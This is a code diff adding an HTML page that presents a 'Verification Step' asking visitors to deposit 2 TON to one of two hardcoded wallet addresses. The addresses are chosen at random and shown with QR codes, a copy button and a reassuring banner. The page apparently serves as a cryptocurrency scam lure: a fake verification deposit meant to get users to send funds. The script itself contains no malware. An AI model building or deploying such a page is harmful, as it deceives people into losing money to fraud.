@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verification Step - TON Deposit</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
+  <style>
+    /* ---------------- Reset & Base Styles ---------------- */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+    }
+
+    body {
+      background-color: #080706;
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px 12px;
+      color: #edeae7;
+      overflow-x: hidden;
+    }
+
+    /* ---------------- Mobile Frame Container ---------------- */
+    .mobile-wrapper {
+      width: 100%;
+      max-width: 410px;
+      background: #110e0c;
+      border-radius: 44px;
+      padding: 26px 20px 18px 20px;
+      box-shadow: 
+        0 0 0 1px rgba(255, 255, 255, 0.08),
+        0 24px 60px -12px rgba(0, 0, 0, 0.85);
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    /* ---------------- Header Section ---------------- */
+    .header-area {
+      text-align: center;
+      padding-top: 4px;
+      padding-bottom: 2px;
+    }
+
+    .main-title {
+      font-size: 1.15rem;
+      font-weight: 800;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      color: #ffffff;
+      text-shadow: 0 1px 4px rgba(0, 0, 0, 0.6);
+    }
+
+    /* Player fun assurance note */
+    .fun-note-banner {
+      margin-top: 8px;
+      background: rgba(222, 176, 137, 0.08);
+      border: 1px dashed rgba(222, 176, 137, 0.28);
+      border-radius: 10px;
+      padding: 6px 10px;
+      font-size: 0.72rem;
+      font-weight: 600;
+      color: #dfb28e;
+      letter-spacing: 0.02em;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    /* ---------------- Asset Selector ---------------- */
+    .asset-section {
+      display: flex;
+      flex-direction: column;
+      gap: 7px;
+    }
+
+    .section-label {
+      font-size: 0.76rem;
+      font-weight: 600;
+      color: #8c847d;
+      margin-left: 4px;
+    }
+
+    .asset-card {
+      background: #1c1815;
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 20px;
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+      transition: background 0.2s, border-color 0.2s;
+    }
+
+    .asset-card:hover {
+      background: #231e1a;
+      border-color: rgba(255, 255, 255, 0.1);
+    }
+
+    .asset-info-group {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .ton-avatar {
+      width: 44px;
+      height: 44px;
+      background: #0098ea;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      box-shadow: 0 4px 12px rgba(0, 152, 234, 0.3);
+    }
+
+    .ton-avatar svg {
+      width: 24px;
+      height: 24px;
+      fill: #ffffff;
+    }
+
+    .asset-text {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .asset-name {
+      font-size: 1rem;
+      font-weight: 800;
+      color: #ffffff;
+      letter-spacing: 0.02em;
+    }
+
+    .network-name {
+      font-size: 0.76rem;
+      color: #8e8680;
+      font-weight: 500;
+    }
+
+    .chevron-icon {
+      color: #7b746d;
+      display: flex;
+      align-items: center;
+    }
+
+    /* ---------------- Main Content Card ---------------- */
+    .deposit-card {
+      background: #1c1815;
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 24px;
+      padding: 18px 18px 20px 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+    }
+
+    .deposit-card-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .card-heading-title {
+      font-size: 1.05rem;
+      font-weight: 800;
+      color: #ffffff;
+    }
+
+    .network-badge {
+      background: #25201c;
+      border: 1px solid rgba(255, 255, 255, 0.04);
+      padding: 5px 12px;
+      border-radius: 100px;
+      font-size: 0.72rem;
+      font-weight: 500;
+      color: #9f9790;
+    }
+
+    /* QR Code Area & Brackets */
+    .qr-container-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      margin-top: 6px;
+    }
+
+    .qr-bracket-box {
+      position: relative;
+      padding: 15px;
+      display: inline-flex;
+      cursor: pointer;
+    }
+
+    .bracket {
+      position: absolute;
+      width: 18px;
+      height: 18px;
+      border-color: #deb088;
+      border-style: solid;
+    }
+
+    .bracket.top-left {
+      top: 0;
+      left: 0;
+      border-width: 2px 0 0 2px;
+      border-top-left-radius: 4px;
+    }
+
+    .bracket.top-right {
+      top: 0;
+      right: 0;
+      border-width: 2px 2px 0 0;
+      border-top-right-radius: 4px;
+    }
+
+    .bracket.bottom-left {
+      bottom: 0;
+      left: 0;
+      border-width: 0 0 2px 2px;
+      border-bottom-left-radius: 4px;
+    }
+
+    .bracket.bottom-right {
+      bottom: 0;
+      right: 0;
+      border-width: 0 2px 2px 0;
+      border-bottom-right-radius: 4px;
+    }
+
+    .qr-white-card {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 12px;
+      width: 196px;
+      height: 196px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+      overflow: hidden;
+      position: relative;
+    }
+
+    .qr-white-card img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      display: block;
+      border-radius: 6px;
+      transition: opacity 0.2s ease, transform 0.2s ease;
+    }
+
+    .scan-note {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: #9f968f;
+    }
+
+    .scan-icon-squares {
+      display: grid;
+      grid-template-columns: repeat(2, 4px);
+      gap: 2px;
+    }
+
+    .scan-icon-squares span {
+      width: 4px;
+      height: 4px;
+      background: #deb088;
+      border-radius: 1px;
+    }
+
+    /* ---------------- Deposit Address Section ---------------- */
+    .address-section {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .address-meta {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 0.76rem;
+      padding: 0 2px;
+    }
+
+    .address-label {
+      color: #8c847d;
+      font-weight: 600;
+    }
+
+    .active-status {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      color: #22c55e;
+      font-weight: 700;
+      font-size: 0.74rem;
+    }
+
+    .active-dot {
+      width: 6px;
+      height: 6px;
+      background-color: #22c55e;
+      border-radius: 50%;
+      box-shadow: 0 0 6px rgba(34, 197, 94, 0.6);
+    }
+
+    .address-box {
+      background: #14110f;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 14px;
+      padding: 14px 16px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.81rem;
+      line-height: 1.5;
+      color: #d1cbc4;
+      word-break: break-all;
+      cursor: pointer;
+      position: relative;
+      transition: border-color 0.2s, background 0.2s;
+    }
+
+    .address-box:hover {
+      background: #181412;
+      border-color: rgba(222, 176, 137, 0.3);
+    }
+
+    /* ---------------- Action Button ---------------- */
+    .btn-outer-glow {
+      border-radius: 100px;
+      padding: 2px;
+      background: transparent;
+      border: 1.5px solid rgba(255, 255, 255, 0.85);
+      margin-top: 4px;
+    }
+
+    .copy-btn {
+      width: 100%;
+      background: #deb088;
+      border: none;
+      outline: none;
+      border-radius: 100px;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      color: #17110c;
+      font-size: 0.96rem;
+      font-weight: 700;
+      cursor: pointer;
+      position: relative;
+      transition: transform 0.15s ease, background-color 0.2s ease;
+    }
+
+    .copy-btn:hover {
+      background: #e8b991;
+    }
+
+    .copy-btn:active {
+      transform: scale(0.985);
+    }
+
+    .copy-btn .sparkle-icon {
+      margin-left: auto;
+      font-size: 1.25rem;
+      line-height: 1;
+      color: #17110c;
+    }
+
+    /* ---------------- Disclaimer Footer ---------------- */
+    .disclaimer-text {
+      text-align: center;
+      font-size: 0.72rem;
+      line-height: 1.45;
+      color: #7b736c;
+      padding: 0 10px 4px 10px;
+    }
+
+    .disclaimer-text strong {
+      color: #d9d4cf;
+      font-weight: 700;
+    }
+
+    .home-indicator {
+      width: 120px;
+      height: 4px;
+      background: #39322b;
+      border-radius: 10px;
+      margin: 8px auto 0 auto;
+    }
+
+    /* ---------------- Toast Feedback ---------------- */
+    .toast {
+      position: absolute;
+      top: 18px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-20px);
+      background: #25201c;
+      border: 1px solid #deb088;
+      color: #deb088;
+      font-size: 0.8rem;
+      font-weight: 700;
+      padding: 8px 18px;
+      border-radius: 30px;
+      opacity: 0;
+      pointer-events: none;
+      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      z-index: 100;
+    }
+
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+    }
+  </style>
+</head>
+<body>
+
+  <main class="mobile-wrapper" role="main">
+
+    <!-- Toast Notification -->
+    <div id="toastNotification" class="toast" aria-live="polite">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"></polyline>
+      </svg>
+      Address copied to clipboard!
+    </div>
+
+    <!-- 1. Header -->
+    <header class="header-area">
+      <h1 class="main-title">VERIFICATION STEP</h1>
+      <div class="fun-note-banner">
+        <span>DO NOT WORRY: we ensure that real players have fun .</span>
+      </div>
+    </header>
+
+    <!-- 2. Asset Selector Card -->
+    <section class="asset-section">
+      <span class="section-label">Asset and network</span>
+      <div class="asset-card" id="assetSelector" title="Asset details">
+        <div class="asset-info-group">
+          <div class="ton-avatar" aria-hidden="true">
+            <svg viewBox="0 0 56 56">
+              <path d="M28 6L6 20.5L28 50L50 20.5L28 6ZM12.2 20.2L28 9.8L43.8 20.2L28 43.5L12.2 20.2Z" fill="white" fill-rule="evenodd" />
+            </svg>
+          </div>
+          <div class="asset-text">
+            <div class="asset-name">TON</div>
+            <div class="network-name">The Open Network (TON)</div>
+          </div>
+        </div>
+        <div class="chevron-icon" aria-hidden="true">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="9 18 15 12 9 6"></polyline>
+          </svg>
+        </div>
+      </div>
+    </section>
+
+    <!-- 3. Main Deposit Card -->
+    <section class="deposit-card">
+      <div class="deposit-card-header">
+        <span class="card-heading-title">TON</span>
+        <span class="network-badge">The Open Network (TON)</span>
+      </div>
+
+      <!-- QR Code Section with Corner Brackets -->
+      <div class="qr-container-wrapper">
+        <div class="qr-bracket-box" id="qrBracketBox" title="Tap to switch paired scanner">
+          <span class="bracket top-left"></span>
+          <span class="bracket top-right"></span>
+          <span class="bracket bottom-left"></span>
+          <span class="bracket bottom-right"></span>
+          
+          <div class="qr-white-card">
+            <!-- Paired QR Image element -->
+            <img id="qrImage" src="" alt="TON Deposit QR Code" />
+          </div>
+        </div>
+
+        <div class="scan-note">
+          <div class="scan-icon-squares">
+            <span></span><span></span><span></span><span></span>
+          </div>
+          <span>Scan this code to deposit 2 TON</span>
+        </div>
+      </div>
+
+      <!-- Address Box Section -->
+      <div class="address-section">
+        <div class="address-meta">
+          <span class="address-label">Banana address</span>
+          <span class="active-status">
+            <span class="active-dot"></span>
+            Active
+          </span>
+        </div>
+        <div class="address-box" id="addressBox" title="Click to copy address">
+          <span id="rawAddress">Loading address...</span>
+        </div>
+      </div>
+
+      <!-- Copy Action Button -->
+      <div class="btn-outer-glow">
+        <button class="copy-btn" id="copyBtn" type="button" aria-label="Copy Address">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+          </svg>
+          <span id="btnText">Copy address</span>
+          <span class="sparkle-icon" aria-hidden="true">&#10022;</span>
+        </button>
+      </div>
+
+    </section>
+
+    <!-- Footer Security Notice -->
+    <footer class="disclaimer-text">
+      Send only <strong>TON</strong> to this address. Sending any other currency may result in permanent loss.
+    </footer>
+
+    <div class="home-indicator" aria-hidden="true"></div>
+
+  </main>
+
+  <script>
+    // ----------------------------------------------------
+    // PAIRED SCANNER DATA (Address strictly coupled to Image)
+    // ----------------------------------------------------
+    const depositPairs = [
+      {
+        id: 1,
+        address: "UQCo0-D4DWT4Q99BJ35ONA7wduh_qtNwwpni55UyMhsFcY-x",
+        image: "qr1.png", // Save your 1st uploaded image as qr1.png in the same folder
+        fallback: "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=UQCo0-D4DWT4Q99BJ35ONA7wduh_qtNwwpni55UyMhsFcY-x"
+      },
+      {
+        id: 2,
+        address: "UQD336K8w8IpsX5GdpXs79nOArRdqjj1ClJNhLkaekrp9bPE",
+        image: "qr2.png", // Save your 2nd uploaded image as qr2.png in the same folder
+        fallback: "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=UQD336K8w8IpsX5GdpXs79nOArRdqjj1ClJNhLkaekrp9bPE"
+      }
+    ];
+
+    let currentPair = null;
+
+    const qrImage = document.getElementById('qrImage');
+    const rawAddress = document.getElementById('rawAddress');
+    const copyBtn = document.getElementById('copyBtn');
+    const btnText = document.getElementById('btnText');
+    const addressBox = document.getElementById('addressBox');
+    const toast = document.getElementById('toastNotification');
+    const qrBracketBox = document.getElementById('qrBracketBox');
+
+    let toastTimer = null;
+    let buttonResetTimer = null;
+
+    // Apply pair to UI with smooth fade
+    function applyPair(pair) {
+      currentPair = pair;
+
+      // Animate transition
+      qrImage.style.opacity = '0';
+      rawAddress.style.opacity = '0';
+
+      setTimeout(() => {
+        rawAddress.textContent = pair.address;
+        qrImage.src = pair.image;
+
+        // Fallback gracefully to dynamic QR code if local image file isn't placed yet
+        qrImage.onerror = function() {
+          this.onerror = null;
+          this.src = pair.fallback;
+        };
+
+        qrImage.style.opacity = '1';
+        rawAddress.style.opacity = '1';
+      }, 150);
+    }
+
+    // Pick a random pair (50% chance each on page load/refresh)
+    function shufflePairRandomly() {
+      const randomIndex = Math.floor(Math.random() * depositPairs.length);
+      applyPair(depositPairs[randomIndex]);
+    }
+
+    // Cycle pair when tapping QR code
+    function togglePair() {
+      const nextIndex = currentPair && currentPair.id === 1 ? 1 : 0;
+      applyPair(depositPairs[nextIndex]);
+    }
+
+    // Copy to clipboard
+    function performCopy() {
+      if (!currentPair) return;
+
+      const textToCopy = currentPair.address;
+
+      if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(textToCopy)
+          .then(handleSuccess)
+          .catch(() => fallbackCopy(textToCopy));
+      } else {
+        fallbackCopy(textToCopy);
+      }
+    }
+
+    function fallbackCopy(text) {
+      const tempTextArea = document.createElement('textarea');
+      tempTextArea.value = text;
+      tempTextArea.style.position = 'fixed';
+      tempTextArea.style.left = '-9999px';
+      document.body.appendChild(tempTextArea);
+      tempTextArea.focus();
+      tempTextArea.select();
+      try {
+        document.execCommand('copy');
+        handleSuccess();
+      } catch (err) {
+        console.error('Failed to copy: ', err);
+      }
+      document.body.removeChild(tempTextArea);
+    }
+
+    function handleSuccess() {
+      btnText.textContent = "Copied!";
+      copyBtn.style.backgroundColor = "#c99a72";
+
+      toast.classList.add('show');
+
+      clearTimeout(buttonResetTimer);
+      clearTimeout(toastTimer);
+
+      buttonResetTimer = setTimeout(() => {
+        btnText.textContent = "Copy address";
+        copyBtn.style.backgroundColor = "";
+      }, 2000);
+
+      toastTimer = setTimeout(() => {
+        toast.classList.remove('show');
+      }, 2400);
+    }
+
+    // Event Listeners
+    copyBtn.addEventListener('click', performCopy);
+    addressBox.addEventListener('click', performCopy);
+    qrBracketBox.addEventListener('click', togglePair);
+
+    // Initial shuffle on load
+    window.addEventListener('DOMContentLoaded', shufflePairRandomly);
+  </script>
+</body>
+</html>
